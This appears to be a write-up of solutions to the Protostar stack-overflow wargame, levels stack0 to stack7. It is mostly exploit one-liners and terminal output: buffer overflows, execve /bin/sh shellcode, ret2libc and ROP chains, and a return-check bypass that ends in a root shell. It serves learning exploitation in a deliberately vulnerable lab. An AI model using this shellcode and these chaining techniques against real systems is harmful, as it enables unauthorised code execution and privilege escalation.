stack0:

root@protostar:/opt/protostar/bin# echo `python -c "print 'A'*200"` | ./stack0
you have changed the 'modified' variable
Segmentation fault
root@protostar:/opt/protostar/bin# 

stack1:

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
....
}

Straight forward, buffer overflow into the 'modified' variable. Fill buffer with and then overwrite modified with 0x61626364 to get to the conditional path we want. Remember  to reverse order for endianness
root@protostar:/opt/protostar/bin# ./stack1 `python -c "print 'A'*64 + '\x61\x62\x63\x64'[::-1]"`     
you have correctly got the variable to the right value
root@protostar:/opt/protostar/bin# 


stack2:

Set environment variable GREENIE so it overflows past the buffer into 'modified'

root@protostar:/opt/protostar/bin# export GREENIE=`python -c "print 'A'*64 + '\x0d\x0a\x0d\x0a'[::-1]"`
root@protostar:/opt/protostar/bin# ./stack2                                                            
you have correctly modified the variable
root@protostar:/opt/protostar/bin# 


stack3:

Open binary in gdb and get the win() function address, or alternatively just do it with objdump:
root@protostar:/opt/protostar/bin# objdump -x ./stack3 | grep -i win
08048424 g     F .text	00000014              win
root@protostar:/opt/protostar/bin#

root@protostar:/opt/protostar/bin# echo `python -c "print 'A'*64 + '\x08\x04\x84\x24'[::-1]"` | ./stack3                                                        
calling function pointer, jumping to 0x08048424
code flow successfully changed
root@protostar:/opt/protostar/bin# 


stack4:

~/c/tools> ./pattern.py create 150
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
~/c/tools> ./pattern.py offset 0x63413563 150
Offset: 76

(gdb) run 
Starting program: /opt/protostar/bin/stack4 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()


root@protostar:/opt/protostar/bin# objdump -x ./stack4 | grep win
080483f4 g     F .text	00000014              win
root@protostar:/opt/protostar/bin# echo `python -c "print 'A'*76 + '\x08\x04\x83\xf4'[::-1]"` | ./stack4
code flow successfully changed
Segmentation fault
root@protostar:/opt/protostar/bin# 


Stack5

(gdb) run
Starting program: /opt/protostar/bin/stack0 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
you have changed the 'modified' variable

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb)

~/c/tools> ./pattern.py create 150
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
~/c/tools> ./pattern.py offset 0x63413563 150
Offset: 76

Shellcode: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80

export into an environment variable: python -c "print '\x90'*53 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"

And then figure out the address in GDB of the environment variable and pass it when you give the input to gets(): python -c "print 'A'*76 + '\xaa\xbb\xcc\xdd'[::-1]"


Stack6

~/c/tools> ./pattern.py create 150
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
~/c/tools> ./pattern.py offset 0x37634136 150
Offset: 80

Offset of 80 to overwrite eip

system() address from gdb: 0xb7ecffb0
exit address: 0xb7ec60c0

(python -c "print 'A'*80 + '\xb7\xec\xff\xb0'[::-1] + '\xb7\xec\x60\xc0'[::-1] + '\xbf\xff\xfe\xa6'[::-1]" && cat) | ./stack6

The last address '\xbf\xff\xfe\xa6' points to the shellcode for /bin/sh that is stored in an environment variable. It would have been harder but plausible to store this value in the 'A' payload. I estimated the pointer and then had to just brute force it to get the exact one.



ROP time, how about we print out the command we are going to execute before we execute it

80 bytes of filler

system() address from gdb: 0xb7ecffb0
printf() address: 0xb7eddf90
exit address: 0xb7ec60c0

Okay so we have to find a gadget that will pop-ret so we can run our system command after the printf, there is a pop ret at 0x08048453 which I found with grep and objdump 

export HACK=//////////////////////////////////////////////////////bin/bash

(python -c "print 'A'*80 + \
        '\xb7\xed\xdf\x90'[::-1] + \
        '\x08\x04\x84\x53'[::-1] + \
        '\xbf\xff\xfe\xa4'[::-1] + \
        '\xb7\xec\xff\xb0'[::-1] + \
        '\xb7\xec\x60\xc0'[::-1] + \
        '\xbf\xff\xfe\xa4'[::-1]" && cat) | ./stack6

[[buffer] | [*printf] | [gadget] | [arg] | [*system] | [*exit] | [arg]]


Alright, now we've done printf() and system, lets do execve instead, since it takes a bunch more arguments. Our payload will look like:

[[buffer] | [*printf] | [gadget] | [arg] | [*execve] | [*exit] | [arg1] [arg2] [arg3]]

*execve: 0xb7f2e170
arg1: pointer to /bin/sh
arg2: pointer to /bin/sh
arg3: pointer to environ

(python -c "print 'A'*80 + \
         '\xb7\xed\xdf\x90'[::-1] + \
         '\x08\x04\x84\x53'[::-1] + \
         '\xbf\xff\xfe\xa4'[::-1] + \
         '\xb7\xf2\xe1\x70'[::-1] + \
         '\xbf\xff\xfe\xa4'[::-1] + \
         '\xbf\xff\xfe\xa4'[::-1] + \
         '\xbf\xff\xfe\x32'[::-1]" && cat) | ./stack6


user@protostar:/opt/protostar/bin$ (python -c "print 'A'*80 + \
>          '\xb7\xed\xdf\x90'[::-1] + \
>          '\x08\x04\x84\x53'[::-1] + \
>          '\xbf\xff\xfe\xa4'[::-1] + \
>          '\xb7\xf2\xe1\x70'[::-1] + \
>          '\xbf\xff\xfe\xa4'[::-1] + \
>          '\xbf\xff\xfe\xa4'[::-1] + \
>          '\xbf\xff\xfe\x32'[::-1]" && cat) | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAßí·AAAAAAAAAAAAßí·¤þÿ¿páò·¤þÿ¿¤þÿ¿2þÿ¿

whoami
user

Stack7:

offset is 80 again

strdup mallocs and stores the input to gets() in the heap

This check also only checks the immediate return, so we only need eip to return to a gadget
that does nothing and then we can ROP into a system() call
if((ret & 0xb0000000) == 0xb0000000)

The gadget we choose just pops into ebp and then rets. Perfect.

layout:
[[command string + filler] | [eip check bypass] | [garbage] | [*system] | [*exit] | [arg]]

arg address can be found in eax

(python -c "print '/'*40 + '/bin/sh\x00' + 'A'*32 + \
            '\x08\x04\x85\xc8'[::-1] + \
            'AAAA' + \
            '\xb7\xec\xff\xb0'[::-1] + \
            '\xb7\xec\x60\xc0'[::-1] + \
            '\x08\x04\xa0\x08'[::-1]" && cat) | ./stack7

user@protostar:/opt/protostar/bin$ (python -c "print '/'*40 + '/bin/sh\x00' + 'A'*32 + \
.....
>             '\x08\x04\xa0\x08'[::-1]" && cat) | ./stack7
input path please: got path /////////////////////////////////////////bin/sh


whoami
root


All done!

